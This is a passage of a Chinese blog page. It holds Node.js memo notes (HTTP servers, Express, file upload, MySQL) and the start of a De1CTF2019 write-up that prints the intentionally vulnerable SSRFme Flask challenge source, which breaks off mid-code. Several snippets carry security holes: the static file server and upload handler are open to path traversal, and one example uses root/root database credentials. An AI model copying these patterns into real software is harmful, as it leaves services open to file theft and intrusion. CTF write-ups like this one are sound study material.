class="string">'util'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Base</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">'base'</span>;</span><br><span class="line">    <span class="keyword">this</span>.base = <span class="number">1991</span>;</span><br><span class="line">    <span class="keyword">this</span>.sayHello = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Hello '</span> + <span class="keyword">this</span>.name);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">Base.prototype.showName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">'sub'</span>;</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(Sub, Base);</span><br><span class="line"><span class="keyword">var</span> objBase = <span class="keyword">new</span> Base();</span><br><span class="line">objBase.showName();</span><br><span class="line">objBase.sayHello();</span><br><span class="line"><span class="built_in">console</span>.log(objBase);</span><br><span class="line"><span class="keyword">var</span> objSub = <span class="keyword">new</span> Sub();</span><br><span class="line">objSub.showName();</span><br><span class="line"><span class="comment">//objSub.sayHello();</span></span><br><span class="line"><span class="built_in">console</span>.log(objSub);</span><br></pre></td></tr></table></figure>

<p>Sub类仅仅继承了Base在原型中定义的函数showname，而base属性和sayHello函数都没有继承。</p>
<h5 id="util-inspect"><a href="#util-inspect" class="headerlink" title="util.inspect"></a>util.inspect</h5><p>这个倒是有点像序列化和反序列化</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">'byvoid'</span>;</span><br><span class="line">    <span class="keyword">this</span>.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="built_in">console</span>.log(util.inspect(obj));</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person &#123; <span class="attr">name</span>: <span class="string">'byvoid'</span>, <span class="attr">toString</span>: [<span class="built_in">Function</span>] &#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用fs模块进行文件操作"><a href="#利用fs模块进行文件操作" class="headerlink" title="利用fs模块进行文件操作"></a>利用fs模块进行文件操作</h4><p><a href="https://www.runoob.com/nodejs/nodejs-fs.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-fs.html</a></p>
<h4 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET/POST"></a>GET/POST</h4><h5 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</span><br><span class="line"><span class="comment">// 解析 url 参数</span></span><br><span class="line"><span class="keyword">var</span> params = url.parse(req.url, <span class="literal">true</span>).query;</span><br><span class="line">res.write(<span class="string">"网站名："</span> + params.name);</span><br><span class="line">res.write(<span class="string">"\n"</span>);</span><br><span class="line">res.write(<span class="string">"网站 URL："</span> + params.url);</span><br><span class="line">res.end();</span><br><span class="line">&#125;).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>

<h5 id="POST型基本格式"><a href="#POST型基本格式" class="headerlink" title="POST型基本格式"></a>POST型基本格式</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"><span class="keyword">var</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line"><span class="comment">// 定义了一个post变量，用于暂存请求体的信息</span></span><br><span class="line"><span class="keyword">var</span> post = <span class="string">''</span>;     </span><br><span class="line"><span class="comment">// 通过req的data事件监听函数，每当接受到请求体的数据，就累加到post变量中</span></span><br><span class="line">req.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;    </span><br><span class="line">post += chunk;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 在end事件触发后，通过querystring.parse将post解析为真正的POST请求格式，然后向客户端返回。</span></span><br><span class="line">req.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">post = querystring.parse(post);</span><br><span class="line">res.end(util.inspect(post));</span><br><span class="line">&#125;);</span><br><span class="line">&#125;).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>



<p>POST型+表单</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"><span class="keyword">var</span> postHTML = </span><br><span class="line"><span class="string">'&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;body&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;form method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'网站名： &lt;input name="name"&gt;&lt;br&gt;'</span> +</span><br><span class="line"><span class="string">'网站 URL： &lt;input name="url"&gt;&lt;br&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="submit"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/body&gt;&lt;/html&gt;'</span>;</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> body = <span class="string">""</span>;</span><br><span class="line">req.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">body += chunk;</span><br><span class="line">&#125;);</span><br><span class="line">req.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 解析参数</span></span><br><span class="line">body = querystring.parse(body);</span><br><span class="line"><span class="comment">// 设置响应头部信息及编码</span></span><br><span class="line">res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf8'</span>&#125;);</span><br><span class="line"><span class="keyword">if</span>(body.name &amp;&amp; body.url) &#123; <span class="comment">// 输出提交的数据</span></span><br><span class="line">res.write(<span class="string">"网站名："</span> + body.name);</span><br><span class="line">res.write(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">res.write(<span class="string">"网站 URL："</span> + body.url);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  <span class="comment">// 输出表单</span></span><br><span class="line">res.write(postHTML);</span><br><span class="line">&#125;</span><br><span class="line">res.end();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>

<p>大概代码逻辑为监听data和end，储存request时data的数据，并且在监听end的同时将数据respone。</p>
<h5 id="模拟请求百度"><a href="#模拟请求百度" class="headerlink" title="模拟请求百度"></a>模拟请求百度</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> req = http.get(<span class="string">"http://www.baidu.com"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"STATUS: "</span> + res.statusCode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bodyChunks = [];</span><br><span class="line">res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">    bodyChunks.push(chunk);</span><br><span class="line">&#125;)</span><br><span class="line">    .on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> body = Buffer.concat(bodyChunks);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Response BODY: "</span> + body);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'The request end...'</span>)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">req.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"ERROR: "</span> + e.message);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h4 id="简单node实现Web服务"><a href="#简单node实现Web服务" class="headerlink" title="简单node实现Web服务"></a>简单node实现Web服务</h4><h5 id="Web服务端"><a href="#Web服务端" class="headerlink" title="Web服务端"></a>Web服务端</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="comment">// 创建服务器</span></span><br><span class="line">http.createServer( <span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>) </span>&#123;  </span><br><span class="line"><span class="comment">// 解析请求，包括文件名</span></span><br><span class="line"><span class="keyword">var</span> pathname = url.parse(request.url).pathname;</span><br><span class="line"><span class="comment">// 输出请求的文件名</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Request for "</span> + pathname + <span class="string">" received."</span>);</span><br><span class="line"><span class="comment">// 从文件系统中读取请求的文件内容</span></span><br><span class="line">fs.readFile(pathname.substr(<span class="number">1</span>), <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(err);</span><br><span class="line"><span class="comment">// HTTP 状态码: 404 : NOT FOUND</span></span><br><span class="line"><span class="comment">// Content Type: text/html</span></span><br><span class="line">response.writeHead(<span class="number">404</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>&#125;);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;             </span><br><span class="line"><span class="comment">// HTTP 状态码: 200 : OK</span></span><br><span class="line"><span class="comment">// Content Type: text/html</span></span><br><span class="line">response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>&#125;);    </span><br><span class="line"><span class="comment">// 响应文件内容</span></span><br><span class="line">response.write(data.toString());        </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  发送响应数据</span></span><br><span class="line">response.end();</span><br><span class="line">&#125;);   </span><br><span class="line">&#125;).listen(<span class="number">8080</span>);</span><br><span class="line"><span class="comment">// 控制台会输出以下信息</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://127.0.0.1:8080/'</span>);</span><br></pre></td></tr></table></figure>

<p>通过异步读取请求的文件名得到请求的资源作为response返回。</p>
<h5 id="Web客户端"><a href="#Web客户端" class="headerlink" title="Web客户端"></a>Web客户端</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="comment">// 用于请求的选项</span></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">host: <span class="string">'localhost'</span>,</span><br><span class="line">port: <span class="string">'8080'</span>,</span><br><span class="line">path: <span class="string">'/index.html'</span>  </span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 处理响应的回调函数</span></span><br><span class="line"><span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line"><span class="comment">// 不断更新数据</span></span><br><span class="line"><span class="keyword">var</span> body = <span class="string">''</span>;</span><br><span class="line">response.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">body += data;</span><br><span class="line">&#125;);</span><br><span class="line">response.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 数据接收完成</span></span><br><span class="line"><span class="built_in">console</span>.log(body);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 向服务端发送请求</span></span><br><span class="line"><span class="keyword">var</span> req = http.request(options, callback);</span><br><span class="line">req.end();</span><br></pre></td></tr></table></figure>

<h4 id="Express框架"><a href="#Express框架" class="headerlink" title="Express框架"></a>Express框架</h4><h5 id="正则匹配请求"><a href="#正则匹配请求" class="headerlink" title="正则匹配请求"></a>正则匹配请求</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/ab*cd'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;   </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"/ab*cd GET 请求"</span>);</span><br><span class="line">res.send(<span class="string">'正则匹配'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h5 id="静态文件设置"><a href="#静态文件设置" class="headerlink" title="静态文件设置"></a>静态文件设置</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(&#39;&#x2F;public&#39;, express.static(&#39;public&#39;));</span><br></pre></td></tr></table></figure>

<h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(req.files[<span class="number">0</span>]);  <span class="comment">// 上传的文件信息</span></span><br><span class="line"><span class="keyword">var</span> des_file = __dirname + <span class="string">"/"</span> + req.files[<span class="number">0</span>].originalname;</span><br><span class="line">fs.readFile( req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">fs.writeFile(des_file, data, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>( err )&#123;</span><br><span class="line"><span class="built_in">console</span>.log( err );</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">response = &#123;</span><br><span class="line">message:<span class="string">'File uploaded successfully'</span>, </span><br><span class="line">filename:req.files[<span class="number">0</span>].originalname</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( response );</span><br><span class="line">res.end( <span class="built_in">JSON</span>.stringify( response ) );</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="Cookie使用"><a href="#Cookie使用" class="headerlink" title="Cookie使用"></a>Cookie使用</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express      = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">'cookie-parser'</span>)</span><br><span class="line"><span class="keyword">var</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line">app.use(cookieParser())</span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Cookies: "</span> + util.inspect(req.cookies));</span><br><span class="line">&#125;)</span><br><span class="line">app.listen(<span class="number">8081</span>)</span><br></pre></td></tr></table></figure>

<h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mysql      = <span class="built_in">require</span>(<span class="string">'mysql'</span>);</span><br><span class="line"><span class="keyword">var</span> connection = mysql.createConnection(&#123;</span><br><span class="line">    host     : <span class="string">'localhost'</span>,</span><br><span class="line">    user     : <span class="string">'root'</span>,</span><br><span class="line">    password : <span class="string">'root'</span>,</span><br><span class="line">    database : <span class="string">'tp_test'</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">connection.connect();</span><br><span class="line"></span><br><span class="line">connection.query(<span class="string">'select * from tp_user where id=1'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">error, results, fields</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (error) <span class="keyword">throw</span> error;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'The solution is: '</span>, results);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>通过引入mysql来进行数据操作。</p>
<h3 id="Nginx错误配置导致目录穿越"><a href="#Nginx错误配置导致目录穿越" class="headerlink" title="Nginx错误配置导致目录穿越"></a>Nginx错误配置导致目录穿越</h3>
      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/09/23/%E5%A4%87%E5%BF%98%E5%BD%95/" data-id="ckabsu397003pkkvr72av2zxg" class="article-share-link" data-share="baidu" data-title="备忘录">Share</a>
      

      
        <a href="http://yoursite.com/2019/09/23/%E5%A4%87%E5%BF%98%E5%BD%95/#ds-thread" class="article-comment-link">Comments</a>
      

      
    </footer>
  </div>
  
</article>


  
    <article id="post-De1CTF2019" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/27/De1CTF2019/" class="article-date">
  <time datetime="2019-08-27T11:34:50.000Z" itemprop="datePublished">2019-08-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/27/De1CTF2019/">De1CTF2019</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我的火车行程贯穿了我的De1CTF..,导致根本没怎么打，异常难受，鸽了很久才补了出来…</p>
<h3 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h3><p>上车的前做的一道题，挺简单的（就是flag不太好找，似乎直接传flag.txt是非预期</p>
<p>PS:预期解是为local_file</p>
<p>题目代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action 